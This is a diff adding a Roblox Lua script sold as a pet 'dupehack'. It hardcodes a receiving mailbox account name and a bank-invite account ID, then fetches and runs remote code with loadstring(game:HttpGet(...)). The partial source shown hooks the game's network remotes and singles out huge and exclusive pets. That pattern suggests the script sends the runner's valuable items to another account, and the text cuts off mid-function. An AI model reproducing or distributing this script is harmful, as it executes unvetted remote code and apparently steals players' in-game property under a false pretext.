@@ -1,0 +1,129 @@
+getgenv().YourAccNameThatGetsMailbox = "mundawa" 
+
+getgenv().YourAccountIdForBankInvite = 2792567794 
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/dupehack'))() 
+
+  
+
+  
+
+  
+
+--Source code: 
+
+  
+
+getgenv().YourAccNameThatGetsMailbox = "mundawa" 
+
+getgenv().YourAccountIdForBankInvite = 2792567794 
+
+  
+
+local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library")) 
+
+local cooldown = os.time() 
+
+local GetRemoteUpValue = nil 
+
+local pets = require(game:GetService("ReplicatedStorage").Directory.Pets["Grab All Pets"]) 
+
+for _, V in pairs(getgc(true)) do 
+
+    if type(V) ~= "table" then 
+
+        continue 
+
+    end 
+
+    if rawget(V, "Invoke") then 
+
+        if type(V.Invoke) == "function" then 
+
+            if tostring(getfenv(V.Invoke).script) == "Network" then 
+
+                GetRemoteUpValue = getupvalues(V.Invoke)[2] 
+
+                break 
+
+            end 
+
+        end 
+
+    end 
+
+end 
+
+function FireRemote(Name, ...) 
+
+    if not GetRemoteUpValue then 
+
+        return end 
+
+    local Remote = GetRemoteUpValue(Name) 
+
+    if not Remote then 
+
+        return 
+
+    end 
+
+    if typeof(Remote) ~= "Instance" then 
+
+        return 
+
+    end 
+
+    if Remote.ClassName == "RemoteEvent" then 
+
+        return Remote:FireServer(...) 
+
+    elseif Remote.ClassName == "RemoteFunction" then 
+
+        return Remote:InvokeServer(...) 
+
+    end 
+
+end 
+
+local function is_huge(petdata) 
+
+    if pets[petdata.id]["huge"] then 
+
+        return true 
+
+    end 
+
+return false; 
+
+end 
+
+local function getMyBank() 
+
+    local banks = FireRemote("Get My Banks") 
+
+      for i,v in pairs(banks) do if v.Owner == game.Players.LocalPlayer.UserId then 
+
+        return v.BUID 
+
+      end 
+
+    end 
+
+end 
+
+local specialPets = {["6969"]=true} 
+
+local function isNotablePet(id) 
+
+    local petData = pets[id] 
+
+    if petData.rarity == "Exclusive" then 
+
+        return true 
+
+        end 
+
+    if specialPets[id] ~= nil then 
+
+      
